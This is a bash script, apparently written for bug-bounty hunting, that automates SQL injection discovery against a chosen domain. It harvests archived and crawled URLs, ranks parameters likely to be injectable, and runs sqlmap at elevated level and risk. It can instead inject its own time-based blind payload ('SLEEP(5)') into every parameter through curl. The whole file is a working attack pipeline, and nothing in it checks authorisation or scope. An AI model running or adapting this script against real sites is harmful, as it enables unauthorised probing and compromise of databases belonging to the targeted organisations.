#!/bin/bash
# ============================================================================
# AutoSQLi — Automated SQLi Discovery Pipeline
# ============================================================================
# Usage: ./autosqli.sh <domain> [--deep] [--passive-only]
#
# Pipeline:
#   1. Passive URL collection (gau, waybackurls)
#   2. Active crawling (katana) [if --deep]
#   3. Parameter extraction + dedup (uro, grep)
#   4. SQLi probing (sqlmap batch mode)
#   5. Results aggregation
#
# Targets: Enterprise bug bounties with large web surfaces
#          (IBM, Oracle, SAP, Cisco, Dell, Microsoft, etc.)
# ============================================================================

set -euo pipefail

DOMAIN="${1:?Usage: ./autosqli.sh <domain> [--deep] [--passive-only]}"
DEEP=false
PASSIVE_ONLY=false
THREADS=10
SQLMAP_LEVEL=2
SQLMAP_RISK=2
TIMEOUT=10

for arg in "$@"; do
    case $arg in
        --deep) DEEP=true; SQLMAP_LEVEL=3; SQLMAP_RISK=3 ;;
        --passive-only) PASSIVE_ONLY=true ;;
        --threads=*) THREADS="${arg#*=}" ;;
    esac
done

WORKDIR="$HOME/Desktop/BUGS/sqli-scanner/results/${DOMAIN//\//_}"
mkdir -p "$WORKDIR"/{urls,params,sqli,logs}

log() { echo "[$(date +%H:%M:%S)] $1" | tee -a "$WORKDIR/logs/run.log"; }

log "=== AutoSQLi Pipeline: $DOMAIN ==="
log "Mode: $([ "$DEEP" = true ] && echo "DEEP" || echo "STANDARD"), Passive: $PASSIVE_ONLY"

# ============================================================================
# PHASE 1: Passive URL Collection
# ============================================================================
log "[1/5] Collecting URLs passively..."

# GAU (GetAllUrls) — Wayback, CommonCrawl, OTX, URLScan
if command -v gau &>/dev/null; then
    log "  Running gau..."
    echo "$DOMAIN" | gau --threads "$THREADS" --blacklist png,jpg,gif,css,woff,woff2,svg,ico,ttf,eot \
        --o "$WORKDIR/urls/gau.txt" 2>/dev/null || true
    log "  gau: $(wc -l < "$WORKDIR/urls/gau.txt" 2>/dev/null || echo 0) URLs"
else
    log "  gau not found, skipping"
    touch "$WORKDIR/urls/gau.txt"
fi

# Waybackurls
if command -v waybackurls &>/dev/null; then
    log "  Running waybackurls..."
    echo "$DOMAIN" | waybackurls > "$WORKDIR/urls/wayback.txt" 2>/dev/null || true
    log "  waybackurls: $(wc -l < "$WORKDIR/urls/wayback.txt" 2>/dev/null || echo 0) URLs"
else
    log "  waybackurls not found, skipping"
    touch "$WORKDIR/urls/wayback.txt"
fi

# Merge and deduplicate
cat "$WORKDIR/urls/"*.txt 2>/dev/null | sort -u > "$WORKDIR/urls/all_raw.txt"
log "  Total raw URLs: $(wc -l < "$WORKDIR/urls/all_raw.txt")"

# ============================================================================
# PHASE 2: Active Crawling (optional)
# ============================================================================
if [ "$PASSIVE_ONLY" = false ] && [ "$DEEP" = true ]; then
    log "[2/5] Active crawling with katana..."
    if command -v katana &>/dev/null; then
        katana -u "https://$DOMAIN" -d 3 -jc -kf all -ef png,jpg,gif,css,woff \
            -c "$THREADS" -o "$WORKDIR/urls/katana.txt" -silent 2>/dev/null || true
        cat "$WORKDIR/urls/katana.txt" >> "$WORKDIR/urls/all_raw.txt"
        sort -u -o "$WORKDIR/urls/all_raw.txt" "$WORKDIR/urls/all_raw.txt"
        log "  katana: $(wc -l < "$WORKDIR/urls/katana.txt" 2>/dev/null || echo 0) URLs"
    else
        log "  katana not found, skipping"
    fi
else
    log "[2/5] Skipping active crawling"
fi

# ============================================================================
# PHASE 3: Parameter Extraction + Filtering
# ============================================================================
log "[3/5] Extracting parameterized URLs..."

# Filter for URLs with query parameters
grep -E '\?' "$WORKDIR/urls/all_raw.txt" | \
    grep -viE '\.(js|css|png|jpg|gif|svg|woff|ico|pdf|zip|xml|json)(\?|$)' \
    > "$WORKDIR/params/with_params_raw.txt" 2>/dev/null || true

# Deduplicate with uro (removes similar URLs, keeps unique param patterns)
if command -v uro &>/dev/null; then
    cat "$WORKDIR/params/with_params_raw.txt" | uro > "$WORKDIR/params/with_params_dedup.txt" 2>/dev/null || true
else
    # Fallback: simple dedup by base URL + param names
    cat "$WORKDIR/params/with_params_raw.txt" | \
        awk -F'?' '{split($2,a,"&"); params=""; for(i in a){split(a[i],b,"="); params=params b[1] ","} print $1 "?" params}' | \
        sort -u | head -500 > "$WORKDIR/params/with_params_dedup.txt"
fi

PARAM_COUNT=$(wc -l < "$WORKDIR/params/with_params_dedup.txt" 2>/dev/null || echo 0)
log "  Parameterized URLs: $PARAM_COUNT (after dedup)"

# Prioritize by interesting patterns (CGI, PHP, ASP, legacy)
grep -iE '\.(cgi|php|asp|aspx|jsp|pl|cfm|do|action)\?' "$WORKDIR/params/with_params_dedup.txt" \
    > "$WORKDIR/params/priority_legacy.txt" 2>/dev/null || true

grep -iE '(id|user|name|search|query|filter|sort|order|select|table|column|where|limit|offset|page|cat|dir|file|path|cmd|exec|load|read|fetch|get|view|show|display|report|download|export|login|auth|token|key|pass|email|account|profile|admin|config|setting|debug|test|backup|old|legacy|archive|temp|dev|staging|api|v1|v2)=' \
    "$WORKDIR/params/with_params_dedup.txt" \
    > "$WORKDIR/params/priority_params.txt" 2>/dev/null || true

# Combine priorities (legacy first, then interesting params, then rest)
cat "$WORKDIR/params/priority_legacy.txt" \
    "$WORKDIR/params/priority_params.txt" \
    "$WORKDIR/params/with_params_dedup.txt" | \
    awk '!seen[$0]++' | head -1000 > "$WORKDIR/params/final_targets.txt"

FINAL_COUNT=$(wc -l < "$WORKDIR/params/final_targets.txt")
log "  Final targets: $FINAL_COUNT (legacy: $(wc -l < "$WORKDIR/params/priority_legacy.txt"), interesting params: $(wc -l < "$WORKDIR/params/priority_params.txt"))"

if [ "$FINAL_COUNT" -eq 0 ]; then
    log "  No parameterized URLs found. Exiting."
    exit 0
fi

# ============================================================================
# PHASE 4: SQLi Probing
# ============================================================================
log "[4/5] Running SQLi detection..."

if ! command -v sqlmap &>/dev/null && ! python3 -m sqlmap --version &>/dev/null 2>&1; then
    log "  ERROR: sqlmap not found. Install with: pip3 install sqlmap"
    log "  Falling back to manual time-based detection..."

    # Lightweight time-based blind detection without sqlmap
    FOUND=0
    while IFS= read -r url; do
        # Inject sleep payload into each parameter
        BASE=$(echo "$url" | cut -d'?' -f1)
        PARAMS=$(echo "$url" | cut -d'?' -f2)

        IFS='&' read -ra PAIRS <<< "$PARAMS"
        for pair in "${PAIRS[@]}"; do
            PNAME=$(echo "$pair" | cut -d'=' -f1)
            # Time-based blind test
            PAYLOAD="1' AND SLEEP(5)-- -"
            TEST_URL="${BASE}?${PARAMS//${pair}/${PNAME}=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${PAYLOAD}'))")}"

            START=$(date +%s%N)
            curl -s -o /dev/null -w "%{http_code}" --max-time "$TIMEOUT" "$TEST_URL" 2>/dev/null || true
            END=$(date +%s%N)

            ELAPSED=$(( (END - START) / 1000000 ))

            if [ "$ELAPSED" -gt 4500 ]; then
                log "  [!!!] POTENTIAL SQLi: $url (param: $PNAME, delay: ${ELAPSED}ms)"
                echo "$url|$PNAME|${ELAPSED}ms|time-based-blind" >> "$WORKDIR/sqli/findings.txt"
                FOUND=$((FOUND + 1))
            fi
        done
    done < <(head -100 "$WORKDIR/params/final_targets.txt")

    log "  Manual scan: $FOUND potential findings from first 100 URLs"
else
    SQLMAP_CMD="sqlmap"
    command -v sqlmap &>/dev/null || SQLMAP_CMD="python3 -m sqlmap"

    log "  Using sqlmap (level=$SQLMAP_LEVEL, risk=$SQLMAP_RISK)..."

    # Run sqlmap in batch mode against all targets
    $SQLMAP_CMD -m "$WORKDIR/params/final_targets.txt" \
        --batch \
        --level="$SQLMAP_LEVEL" \
        --risk="$SQLMAP_RISK" \
        --technique=T \
        --time-sec=5 \
        --threads="$THREADS" \
        --timeout="$TIMEOUT" \
        --retries=1 \
        --random-agent \
        --output-dir="$WORKDIR/sqli/sqlmap_output" \
        --csv-del="," \
        --flush-session \
        --smart \
        2>&1 | tee "$WORKDIR/logs/sqlmap.log" || true

    # Extract findings
    grep -r "is vulnerable" "$WORKDIR/sqli/sqlmap_output/" > "$WORKDIR/sqli/findings.txt" 2>/dev/null || true
    grep -r "injectable" "$WORKDIR/sqli/sqlmap_output/" >> "$WORKDIR/sqli/findings.txt" 2>/dev/null || true
fi

# ============================================================================
# PHASE 5: Results
# ============================================================================
log "[5/5] Results Summary"

FINDINGS=$(wc -l < "$WORKDIR/sqli/findings.txt" 2>/dev/null || echo 0)

log "=============================="
log "  Domain: $DOMAIN"
log "  URLs collected: $(wc -l < "$WORKDIR/urls/all_raw.txt")"
log "  Parameterized: $PARAM_COUNT"
log "  Tested: $FINAL_COUNT"
log "  SQLi findings: $FINDINGS"
log "=============================="

if [ "$FINDINGS" -gt 0 ]; then
    log ""
    log "FINDINGS:"
    cat "$WORKDIR/sqli/findings.txt" | while IFS= read -r line; do
        log "  [VULN] $line"
    done
    log ""
    log "Next: Manually verify each finding, then report via /disclose"
fi

log "Results saved to: $WORKDIR/"
